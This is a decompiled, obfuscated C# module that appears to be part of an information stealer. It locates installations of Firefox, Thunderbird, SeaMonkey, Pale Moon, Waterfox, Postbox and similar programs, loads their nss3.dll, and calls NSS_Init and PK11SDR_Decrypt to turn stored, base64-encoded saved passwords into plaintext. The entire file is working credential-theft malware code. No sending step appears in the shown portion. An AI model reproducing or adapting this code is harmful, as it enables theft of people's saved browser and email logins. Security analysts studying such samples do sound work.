using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Ӛ2ا뫆Π;

[StandardModule]
internal sealed class Ԍ_002D_06E3嵱뜸
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long DLLFunctionDelegate6();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

	public struct TSECItem
	{
		public int SECItemType;

		public IntPtr SECItemData;

		public int SECItemLen;
	}

	private static IntPtr Bأ_005E_0300盀;

	public static List<IntPtr> ŔՕ_FFFD_FFFD늻 = new List<IntPtr>();

	[DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
	public static extern IntPtr Cﾭ丐_FFFD蠺(string ζ_FFFDĪ_060C븤);

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr @_06E3_FFFDtݶ(IntPtr Αأҏ_FFFD皍, string _FFFDɇޗߟ皍);

	private static T AܣjԹ_FFFD<T>(IntPtr ΠB߂_26CAǎ, string հӓ_05B4_1CFC_00AB)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		T result = default(T);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 73:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				result = (T)(object)Marshal.GetDelegateForFunctionPointer(@_06E3_FFFDtݶ(ΠB߂_26CAǎ, հӓ_05B4_1CFC_00AB), typeof(T));
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 73;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static long 뫆ʭ_07B4Òk()
	{
		return AܣjԹ_FFFD<DLLFunctionDelegate6>(Bأ_005E_0300盀, "NSS_Shutdown")();
	}

	[DllImport("kernel32.dll", EntryPoint = "FreeLibrary", SetLastError = true)]
	public static extern bool ҭjߟ_FFFDӥ(IntPtr _0331ã皍ʤc);

	public static long 꾯盀ҢĪ_005E(string _2_0331ɮ_FFFD뫆)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Thunderbird\\";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Thunderbird\\";
		string text3 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Firefox\\";
		string text5 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\SeaMonkey\\";
		string text6 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\SeaMonkey\\";
		string text7 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Comodo\\IceDragon\\";
		string text8 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Comodo\\IceDragon\\";
		string text9 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Cyberfox\\";
		string text10 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Cyberfox\\";
		string text11 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Pale Moon\\";
		string text12 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Pale Moon\\";
		string text13 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Waterfox Current\\";
		string text14 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Waterfox Current\\";
		string text15 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\SlimBrowser\\";
		string text16 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\SlimBrowser\\";
		string text17 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		string text18 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Firefox\\";
		string text19 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Postbox\\";
		string text20 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Postbox\\";
		string text21 = null;
		if (Directory.Exists(text))
		{
			text21 = text;
		}
		else if (Directory.Exists(text3))
		{
			text21 = text3;
		}
		else if (Directory.Exists(text2))
		{
			text21 = text2;
		}
		else if (Directory.Exists(text4))
		{
			text21 = text4;
		}
		else if (Directory.Exists(text5))
		{
			text21 = text5;
		}
		else if (Directory.Exists(text6))
		{
			text21 = text6;
		}
		else if (Directory.Exists(text7))
		{
			text21 = text7;
		}
		else if (Directory.Exists(text8))
		{
			text21 = text8;
		}
		else if (Directory.Exists(text9))
		{
			text21 = text9;
		}
		else if (Directory.Exists(text10))
		{
			text21 = text10;
		}
		else if (Directory.Exists(text12))
		{
			text21 = text12;
		}
		else if (Directory.Exists(text11))
		{
			text21 = text11;
		}
		else if (Directory.Exists(text13))
		{
			text21 = text13;
		}
		else if (Directory.Exists(text14))
		{
			text21 = text14;
		}
		else if (Directory.Exists(text15))
		{
			text21 = text15;
		}
		else if (Directory.Exists(text16))
		{
			text21 = text16;
		}
		else if (Directory.Exists(text17))
		{
			text21 = text17;
		}
		else if (Directory.Exists(text18))
		{
			text21 = text18;
		}
		else if (Directory.Exists(text19))
		{
			text21 = text19;
		}
		else if (Directory.Exists(text20))
		{
			text21 = text20;
		}
		ŔՕ_FFFD_FFFD늻.Add(Cﾭ丐_FFFD蠺(text21 + "\\mozglue.dll"));
		Bأ_005E_0300盀 = Cﾭ丐_FFFD蠺(text21 + "\\nss3.dll");
		ŔՕ_FFFD_FFFD늻.Add(Bأ_005E_0300盀);
		return AܣjԹ_FFFD<DLLFunctionDelegate>(Bأ_005E_0300盀, "NSS_Init")(_2_0331ɮ_FFFD뫆);
	}

	public static string _0306ٷĂҏ븤(string Ŵ_FFFD_D95F_DF63_058F)
	{
		IntPtr intPtr = IntPtr.Zero;
		StringBuilder stringBuilder = new StringBuilder(Ŵ_FFFD_D95F_DF63_058F);
		try
		{
			byte[] array = Convert.FromBase64String(Ŵ_FFFD_D95F_DF63_058F);
			intPtr = Marshal.AllocHGlobal(array.Length);
			Marshal.Copy(array, 0, intPtr, array.Length);
			TSECItem _F0B9_D997_DC9A_FFFD䕃 = default(TSECItem);
			TSECItem 泮ӛ_FFFD_FFFDݶ = default(TSECItem);
			泮ӛ_FFFD_FFFDݶ.SECItemType = 0;
			泮ӛ_FFFD_FFFDݶ.SECItemData = intPtr;
			泮ӛ_FFFD_FFFDݶ.SECItemLen = array.Length;
			if (εk_FFFDߟ_FFFD(ref 泮ӛ_FFFD_FFFDݶ, ref _F0B9_D997_DC9A_FFFD䕃, 0) == 0 && _F0B9_D997_DC9A_FFFD䕃.SECItemLen != 0)
			{
				byte[] array2 = new byte[checked(_F0B9_D997_DC9A_FFFD䕃.SECItemLen - 1 + 1)];
				Marshal.Copy(_F0B9_D997_DC9A_FFFD䕃.SECItemData, array2, 0, _F0B9_D997_DC9A_FFFD䕃.SECItemLen);
				return Encoding.ASCII.GetString(array2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
		return null;
	}

	public static int εk_FFFDߟ_FFFD(ref TSECItem 泮ӛ_FFFD_FFFDݶ, ref TSECItem _F0B9_D997_DC9A_FFFD䕃, int _FFFDƌˤҚל)
	{
		IntPtr ptr = @_06E3_FFFDtݶ(Bأ_005E_0300盀, "PK11SDR_Decrypt");
		DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(ptr, typeof(DLLFunctionDelegate5));
		return dLLFunctionDelegate(ref 泮ӛ_FFFD_FFFDݶ, ref _F0B9_D997_DC9A_FFFD䕃, _FFFDƌˤҚל);
	}
}
